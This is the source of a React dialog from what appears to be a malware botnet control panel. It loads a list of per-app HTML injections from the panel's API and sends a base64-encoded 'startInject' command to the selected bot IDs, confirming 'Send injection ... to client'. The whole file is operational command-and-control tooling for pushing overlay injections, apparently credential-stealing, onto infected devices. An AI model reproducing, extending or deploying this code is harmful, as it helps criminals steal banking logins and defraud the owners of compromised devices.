import React, { useState, useEffect, useRef } from 'react'
import SettingsContext from 'src/settings';
import { Dialog, Box, FormControl,InputLabel, Switch, Select, MenuItem, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faXmarkSquare, faPaperPlane, faSpinner } from '@fortawesome/free-solid-svg-icons';
import $ from 'jquery';

import { toast } from 'react-toastify';
export default function Sendinj(props) {

    const { openPopup, setOpenPopup, selected} = props;
    const [app, setApp] = useState('');

    useEffect(() => {   
        if (openPopup && SettingsContext.Injections.length < 1) {
            let request = $.ajax({
                type: 'POST',
                url: SettingsContext.restApiUrl,
                data: {
                    'params':  new Buffer ('{"request":"getHtmlInjection","password":"' + SettingsContext.password + '"}').toString('base64')
                }
              });
          
              request.done(function(msg) {
                let response = (JSON.parse(msg))
    
                let allinj = [];
    
                for (let i = 0; i < response.dataInjections.length; i++) {
                    const json = response.dataInjections[i];
                    allinj.push(json);
                }
                
                SettingsContext.Injections = allinj
                
              }.bind(this));
        } 
      }, [openPopup]);

      function SendCommand(app) {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer(
                    '{"' + 
                    'request":"botsSetCommand",' + 
                    '"idbot":"' + selected.join(',') + '",' + 
                    '"command":"' + new Buffer('{"name":"startInject","app":"' + app + '"}').toString('base64') + '"' + 
                    ',"password":"' + SettingsContext.password + '"}').toString('base64')
            }
        });
    }
    
    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="md">
            <DialogContent dividers>
                    <div style={{ display: "flex", justifyContent: "space-between"}}>

                    <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={220}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faPaperPlane}/>
                        </SvgIcon>
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Send Injection</Typography>
                        
                    </Box>

                    <Button
                        onClick={()=>{setOpenPopup(false)}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x"/>
                    </Button>
                    </div>

                    <FormControl sx={{mt: 3}} fullWidth>
                    
                    {SettingsContext.Injections.length > 0 ? 
                    <><InputLabel id="demo-simple-select-label">App</InputLabel><Select
                            labelId="demo-simple-select-label"
                            id="demo-simple-select"
                            label="App"
                            value={app}
                            onChange={() => { setApp(event.target.textContent); } }
                        >
                            {SettingsContext.Injections.map((item, index) => (
                                <MenuItem sx={{ display: 'flex', alignItems: 'center' }} key={index.app} value={item.app}>
                                    <ListItemAvatar>
                                        <img width={40} src={`data:image/png;base64,${item.icon}`}></img>
                                    </ListItemAvatar>
                                    <span>{item.app}</span>
                                </MenuItem>
                            ))}
                        </Select></> : <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', display: 'flex', justifyContent: 'center', alignItems: 'center', animation: 'spin 1s infinite linear',}}>
                <FontAwesomeIcon icon={faSpinner} spin size="5x" /></div>}
                    </FormControl>

                    <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                    <Button onClick={()=> {if (app != '') { SendCommand(app); setOpenPopup(false);  setApp(''); toast.success("Send injection " + app + " to client")} else { toast.error("You need to select an app to inject"); } }} sx={{mt: 3, width: 115, height: 42, }} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faPaperPlane} /></SvgIcon>)}variant="contained">Send</Button>
                    </div>
            </DialogContent>
        </Dialog>
    )
}
